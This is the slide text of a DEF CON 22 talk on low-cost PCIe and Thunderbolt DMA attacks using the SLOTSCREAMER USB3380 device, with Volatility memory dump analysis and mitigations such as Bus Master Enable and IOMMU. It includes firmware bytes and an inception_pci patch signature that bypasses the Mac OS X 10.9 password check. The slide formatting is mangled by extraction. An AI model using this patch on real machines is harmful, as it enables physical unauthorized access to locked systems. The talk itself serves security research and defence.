DEFCON 22 
Joe FitzPatrick 
Miles Crabill 
Stupid PCIe Tricks  
featuring 
NSA Playset: PCIe 
●  Electrical Engineering education 
with focus on CS and Infosec 
●  8 years doing security research, 
speed debug, and tool 
development for CPUs 
●  Hardware Pen Testing of CPUs 
●  Security training for functional 
validators worldwide 
whoami 
Joe FitzPatrick 
@securelyfitz 
PI:EMAIL 
“if Joe Fitz, he sitz” 
●  Computer Science student at 
Lewis & Clark College 
●  About 2 years of experience in 
security research 
●  Little to no prior hardware 
hacking experience 
●  Learned this stuff as I went, with 
tons of help from Joe 
whoami 
Miles Crabill 
@milescrabill 
PI:EMAIL 
Miles’ hot tub picture was 
a bit too explicit 
This is early phase research with poor citations 
A lot of people have done work in this area before us 
The difference is that we are trying to make this type of 
attack inexpensive 
Disclaimer 
What is PCIe? 
PCIe is PCI! 
PCIe is NOT PCI! 
Foto tomada por Jorge González http://es.wikipedia.org 
Photo by snikerdo http://en.wikipedia.org 
Links and Lanes 
Diagram: PCIe 2.1 specification 
Hierarchy 
Diagram: PCIe 2.1 specification 
Switching and Routing 
Diagram: PCIe 2.1 specification 
Layers 
Diagram: PCIe 2.1 specification 
Configuration Space 
Diagram: PCIe 2.1 specification 
Configuration Space 
Diagram: PCIe 2.1 specification 
Configuration Space 
Diagram: PCIe 2.1 specification 
Configuration Space 
Diagram: PCIe 2.1 specification 
Configuration Space 
Diagram: PCIe 2.1 specification 
Enumeration 
Diagram: PCIe 2.1 specification 
Routing PCIe 
The Step-By-Step, Complicated, 
Mandatory, Inflexible Rules of 
Routing PCIe: 
1. route pairs adjacent and equal length 
The Step-By-Step, Complicated, 
Mandatory, Inflexible Rules of 
Routing PCIe: 
1. route pairs adjacent and equal length 
… that’s mostly it 
The Step-By-Step, Complicated, 
Mandatory, Inflexible Rules of 
Routing PCIe: 
Routing PCIe 
System Board Traces 
12 Inches 
Add-in Card Traces 
3.5 inches 
Chip-to-Chip Routes 
15 inches 
Follow these rules and your board might work. 
Break them and it might not. 
Routing PCIe 
Minimum PCIe: 
●  2.5GHz TX 
●  2.5GHz RX 
●  100MHz Clock (optional) 
Routing PCIe 
Cross-section of a USB 3.0 cable. Image courtesy of USB Implementers Forum 
Thunderbolt 
Getting PCIe on 
Things Without It 
Introducing SLOTSCREAMER 
from Steve Weis’ Black Hat 2014 talk “Protecting Data In-Use from Firmware and Physical Attacks” 
which has similar sources for NSA Ant catalog product details 
Thunderbolt 
Thunderbolt 
Thunderbolt 
USB3380.c: 
Thunderbolt 
Thunderbolt 
USB3380 Firmware 
USB3380 Firmware 
>"xxd"SLOTSCREAMER.bin""
0000000:"5a00"0c00"2310"4970"0000"0000"e414"bc16""Z...#.Ip........"
"
"
USB3380 Firmware 
>"xxd"SLOTSCREAMER.bin""
0000000:"5a00"0c00"2310"4970"0000"0000"e414"bc16""Z...#.Ip........"
"
"
USB3380 Firmware 
>"xxd"SLOTSCREAMER.bin""
0000000:"5a00"0c00"2310"4970"0000"0000"e414"bc16""Z...#.Ip........"
"
"
That’s all! 
Attacking via PCIe 
Target-side Software 
Target-side Software 
●  None 
Attack-side Software 
Attack-side Software 
Quick ‘n’ dirty 
PCIe memory 
read/write with 
PyUSB 
Demo - memory read/write 
More attack-side Software 
More attack-side Software 
#"EQUALS:"
#"
#"""|FF"Offset"0x00""""""""""""""""""""""
#""/""""""""""""""""""""""""""""""""""""""""""""
#"/\"""""""""""""|FpatchoffsetFFFFFFFFFFFFFFF>[b0"01]""""
#"00"01"02"03"04"05"06"07"08"09"0a"0b"0c"0d"0e"0f".."(byte"offset)"
#"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
#"c6"0f"85"a0"b8"00"00"b8"ab"05"03"ff"ef"01"00"00".."(chunk"of"memory"data)"
#"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
#"\______/"\___/"\______/"
#"""""\""""""\"""""""\"
#""""""\""""""\"""""""|FF"Chunk"2"at"internaloffset"0x05"
#"""""""\""""""|FF"Some"data"(ignore,"don't"match"this)"
#""""""""|FF"Chunk"1"at"internaloffset"0x00"
#"\_____________________/"
#""""""""""""\"
#"""""""""""""|FF"Entire"signature"
#"
"
More attack-side Software 
"
"""""""""""{'OS':"'Mac"OS"X"10.9',"
""""""""""""'versions':"['10.9'],"
""""""""""""'architectures':"['x64'],"
""""""""""""'name':"'DirectoryService/OpenDirectory"unlock/privilege"escalation',"
""""""""""""'notes':"'Overwrites"the"DoShadowHashAuth/ODRecordVerifyPassword"return"value.""
""""""""""""'signatures':"[{'offsets':"[0x1e5],"#"10.9"
""""""""""""""""""""""""""""'chunks':"[{'chunk':"0x4488e84883c4685b415c415d415e415f5d,"
""""""""""""""""""""""""""""""""""""""""'internaloffset':"0x00,"
""""""""""""""""""""""""""""""""""""""""'patch':"0x90b001,"#"nop;"mov"al,1;"
""""""""""""""""""""""""""""""""""""""""'patchoffset':"0x00}]}]}]"
"
"
Taking Dumps 
DMA Stool Analysis with Volatility  
dmesg log of the attack recovered from the 
memory dump of the victim 
DMA Stool Analysis with Volatility  
names, pids, and uids 
for dumped processes 
DMA Stool Analysis with Volatility  
extracted machine 
info 
the perfect amount of 
memory to dump! 
Thunderbolt 
Diagram: Apple Thunderbolt Device Driver Programming Guide 
HALIBUTDUGOUT 
DIY 
nsaplayset.org 
Hardware 
http://www.hwtools.net/PLX.html 
Software 
tools used in 
preparing this 
presentation: 
●  plx’s flashing 
software 
●  pyusb + scripts 
●  inception_pci 
●  volatility for 
memory analysis 
Mitigations 
Bus Master Enable 
joefitz@linUX31a:~/Documents/pcie/SLOTSCREAMER/inception_pci$ lspci -vv | grep BusMaster 
 Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- 
 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx+ 
 Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- 
 Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx+ 
 Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx+ 
 Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- 
 Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx+ 
 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- 
 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- 
 Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- 
 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- 
 Control: I/O+ Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx+ 
 Control: I/O+ Mem+ BusMaster- SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- 
 Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- DisINTx- 
 Control: I/O- Mem+ BusMaster+ SpecCycle- MemWINV- VGASnoop- ParErr- Stepping- SERR- FastB2B- 
DisINTx+ 
IOMMU 
Abstinence? 
because 0.01% is too much 
Sorry, Previous Track 2 Speakers 
ALLOYVIPER 
Building ALLOYVIPER 
Building ALLOYVIPER 
Building ALLOYVIPER 
Building ALLOYVIPER 
Building ALLOYVIPER 
Building ALLOYVIPER 
Building ALLOYVIPER 
Building ALLOYVIPER 
Pay no attention to the mitm behind the curtain 
Acknowledgements 
•  NSA Playset Crew 
•  Carsten for his work on Inception 
(breaknenter.org) 
•  Great Scott Gadgets 
•  Dean Pierce 
•  @snare and @_rezin_ 
•  And everyone else! 
mike_pizza 
Joe FitzPatrick 
@securelyfitz 
PI:EMAIL 
http://www.securinghardware.com 
Questions? 
Miles Crabill 
@milescrabill 
PI:EMAIL 
milescrabill.com